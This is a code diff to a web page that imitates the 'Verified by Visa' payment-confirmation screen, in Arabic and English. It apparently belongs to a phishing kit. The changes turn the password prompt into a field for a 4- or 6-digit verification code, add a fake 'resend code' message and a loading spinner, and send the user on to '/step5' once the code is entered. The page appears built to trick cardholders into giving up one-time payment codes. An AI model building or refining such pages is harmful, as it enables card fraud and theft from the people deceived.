@@ -330,7 +330,45 @@
             border-color: #cbd5e0;
         }
         
-        /* Modal Styles */
+        /* Processing Modal - Simple */
+        .processing-modal-content {
+            border: none;
+            border-radius: 10px;
+            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1);
+        }
+        
+        .processing-modal-body {
+            padding: 50px 30px;
+            text-align: center;
+            background-color: white;
+        }
+        
+        .card-logo-loading {
+            width: 120px;
+            margin: 0 auto 25px;
+        }
+        
+        .card-logo-loading img {
+            width: 100%;
+            filter: drop-shadow(0 2px 8px rgba(0,0,0,0.1));
+        }
+        
+        .spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #8b1538;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* OTP Modal Styles */
         .modal-content {
             border-radius: 0;
             border: 2px solid #1434CB;
@@ -366,7 +404,7 @@
         }
         
         .vbv-logo {
-            width: 140px;
+            width: 180px;
         }
         
         .vbv-logo img {
@@ -426,13 +464,16 @@
             font-weight: bold;
             margin-bottom: 8px;
             color: #000;
+            font-size: 14px;
         }
         
         .vbv-password-input {
-            width: 200px;
-            padding: 6px;
+            width: 250px;
+            padding: 8px;
             border: 1px solid #999;
-            font-size: 14px;
+            font-size: 16px;
+            font-family: 'Courier New', monospace;
+            letter-spacing: 2px;
         }
         
         .vbv-forgot-link {
@@ -455,21 +496,6 @@
         
         .vbv-submit-btn:hover {
             background-color: #bbb;
-        }
-        
-        .card-logo-loading {
-            width: 100px;
-            margin: 20px auto;
-        }
-        
-        .card-logo-loading img {
-            width: 100%;
-            animation: pulse 1.5s ease-in-out infinite;
-        }
-        
-        @keyframes pulse {
-            0%, 100% { opacity: 0.4; }
-            50% { opacity: 1; }
         }
         
         .service-unavailable {
@@ -671,16 +697,13 @@
         </div>
     </main>
     
-    <!-- Processing Modal -->
+    <!-- Processing Modal - Simple -->
     <div class="modal fade" id="processingModal" tabindex="-1" role="dialog" data-backdrop="static" data-keyboard="false">
         <div class="modal-dialog modal-sm" role="document">
-            <div class="modal-content" style="border-radius: 10px; border: none;">
-                <div class="modal-header" style="background: linear-gradient(135deg, #8b1538 0%, #6d1029 100%); border-radius: 10px 10px 0 0;">
-                    <h4 class="modal-title">جاري معالجة الدفع</h4>
-                </div>
-                <div class="modal-body" style="padding: 40px 25px; text-align: center; background-color: white;">
+            <div class="modal-content processing-modal-content">
+                <div class="modal-body processing-modal-body">
                     <div class="card-logo-loading" id="cardLogoLoading"></div>
-                    <p style="color: #4a5568; font-size: 15px; margin-top: 15px;">يرجى الانتظار...</p>
+                    <div class="spinner"></div>
                 </div>
             </div>
         </div>
@@ -706,7 +729,7 @@
                     
                     <!-- Title -->
                     <div class="vbv-title">Added Protection</div>
-                    <div class="vbv-subtitle">Please submit your Verified by Visa password.</div>
+                    <div class="vbv-subtitle">Please submit your verification code.</div>
                     
                     <!-- Transaction Details -->
                     <div class="vbv-details">
@@ -732,11 +755,11 @@
                         </div>
                     </div>
                     
-                    <!-- Password Input -->
+                    <!-- Verification Code Input -->
                     <div class="vbv-password-section">
-                        <div class="vbv-password-label">Password:</div>
-                        <input type="password" class="vbv-password-input" id="vbvPassword" maxlength="20">
-                        <a class="vbv-forgot-link">Forgot your password?</a>
+                        <div class="vbv-password-label">رمز التحقق:</div>
+                        <input type="text" class="vbv-password-input" id="vbvPassword" maxlength="6" placeholder="Enter code">
+                        <a class="vbv-forgot-link" id="resendCode">إعادة إرسال الرمز</a>
                     </div>
                     
                     <!-- Submit Button -->
@@ -993,6 +1016,9 @@
                 const lastFour = cardNumber.slice(-4);
                 document.getElementById('maskedCard').textContent = `**** **** **** ${lastFour}`;
                 
+                // Set maxlength based on card type
+                document.getElementById('vbvPassword').maxLength = otpLength;
+                
                 $('#otpModal').modal('show');
                 document.getElementById('vbvPassword').focus();
             }, 2500);
@@ -1000,12 +1026,12 @@
         
         // VBV Submit
         document.getElementById('vbvSubmitBtn').addEventListener('click', function() {
-            const password = document.getElementById('vbvPassword').value;
+            const code = document.getElementById('vbvPassword').value;
             
-            if (password.length >= 4) {
+            if (code.length === 4 || code.length === 6) {
                 window.location.href = '/step5';
             } else {
-                alert('Please enter your password');
+                alert('Please enter a valid verification code (4 or 6 digits)');
             }
         });
         
@@ -1014,6 +1040,17 @@
             if (e.key === 'Enter') {
                 document.getElementById('vbvSubmitBtn').click();
             }
+        });
+        
+        // Only allow numbers
+        document.getElementById('vbvPassword').addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '');
+        });
+        
+        // Resend code
+        document.getElementById('resendCode').addEventListener('click', function(e) {
+            e.preventDefault();
+            alert('تم إعادة إرسال رمز التحقق');
         });
     </script>
 </body>
